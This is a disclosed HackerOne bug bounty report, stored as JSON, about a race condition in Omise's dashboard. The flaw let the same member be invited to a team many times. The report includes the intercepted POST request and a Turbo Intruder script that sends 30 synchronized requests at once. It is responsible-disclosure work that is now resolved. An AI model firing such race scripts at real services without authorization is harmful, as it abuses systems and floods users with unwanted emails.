{
  "id": 1285538,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjg1NTM4",
  "url": "https://hackerone.com/reports/1285538",
  "title": "Race condition on action: Invite members to a team",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2021-07-31T15:37:56.591Z",
  "submitted_at": "2021-07-31T15:37:56.644Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sim4n6",
    "url": "/sim4n6",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/8bf5mtkkz7uno66lpmqhea1wvgka/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21045,
    "url": "https://hackerone.com/omise",
    "handle": "omise",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/nm9gwmg377pece9jzkjw5k1o7tm7/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/nm9gwmg377pece9jzkjw5k1o7tm7/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Omise",
      "twitter_handle": "omise",
      "website": "https://www.opn.ooo",
      "about": "Next generation of payment Platform"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-03-22T21:52:00.002Z",
  "bug_reporter_agreed_on_going_public_at": "2022-02-20T21:51:45.107Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nHello there,\n\nI've found a race condition vulnerability which allows the invitation of the same member multiple times to a single team via the dashboard.\n\n## Tools needed:\n * Burp Suite community edition  with the extension Turbo Intruder.\nThis is the way I adopted to detect such vulnerability, there is also other ways.\n\n## Steps to reproduce:\n\n  1. Login to an account on omise.co.\n  1. Invite a member for testing \n  1. Intercept the main request to the endpoint /team/memberships using the method POST. Modify the HTTP/1.1 protocol for the communication and add `x-request: %s` for Turbo intruder extension. \n```\nPOST /team/memberships HTTP/2\nHost: dashboard.omise.co\nCookie: ██████████\nContent-Length: 271\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: ███\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: ███████\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nx-request: %s\nConnection: close\n\nauthenticity_token=<TOKEN>email=<INVITED-EMAIL>&membership%5Badmin%5D=0&membership%5Badmin%5D=1&membership%5Btechnical%5D=0&membership%5Btechnical%5D=1&commit=Send+invitation\n```\n\n  1. Send the modified intercepted request with the invited member to Turbo intruder, and write the following attack code :\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                           requestsPerConnection=100,\n                           pipeline=False\n                           )\n\n    # the 'gate' argument blocks the final byte of each request until openGate is invoked\n    for i in range(30):\n        engine.queue(target.req, target.baseInput, gate='race1')\n\n    # wait until every 'race1' tagged request is ready\n    # then send the final byte of each request\n    # (this method is non-blocking, just like queue)\n    engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\n  1. Start the Turbo intruder attack. The results are captured in the following screenshots: \n█████████ \nAs you can see there is multiple `200 OK` which means a race condition vulnerability happened.\n\n 1. Check the list of invited members to the team. In my case, I used in this attack the invited member : `█████████████████`. As you can see the list of invited members to the team is duplicate many times.  \n██████████\n\nHowever, when the invited user is already invited. You get the following error message :\n█████████\n\n1. As consequence of the attack, the same email got invited  and received multiple emails as can be seen in the following email:\n ████\n\n 1. By the way, the bug persists even if the invited member accept the invitation. More invitations will remain in the list of the invited members of the team which is undesirable by design.   \n\nIf you need any further details, please let me know.\nRegards.\n\n## Impact\n\nRace Condition vulnerability allows the invitation of the same user multiple times.",
  "weakness": {
    "id": 65,
    "name": "Business Logic Errors"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-03-22T21:51:45.202Z",
  "allow_singular_disclosure_after": -110427636.49562809,
  "singular_disclosure_allowed": true,
  "vote_count": 23,
  "voters": [
    "he4am",
    "omarelfarsaoui",
    "ezzra",
    "loaymorad",
    "mr-medi",
    "dazaiii",
    "never_die",
    "shubham_srt",
    "2026",
    "thalaivar304",
    "and 13 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 16435,
    "asset_type": "URL",
    "asset_identifier": "dashboard.omise.co",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
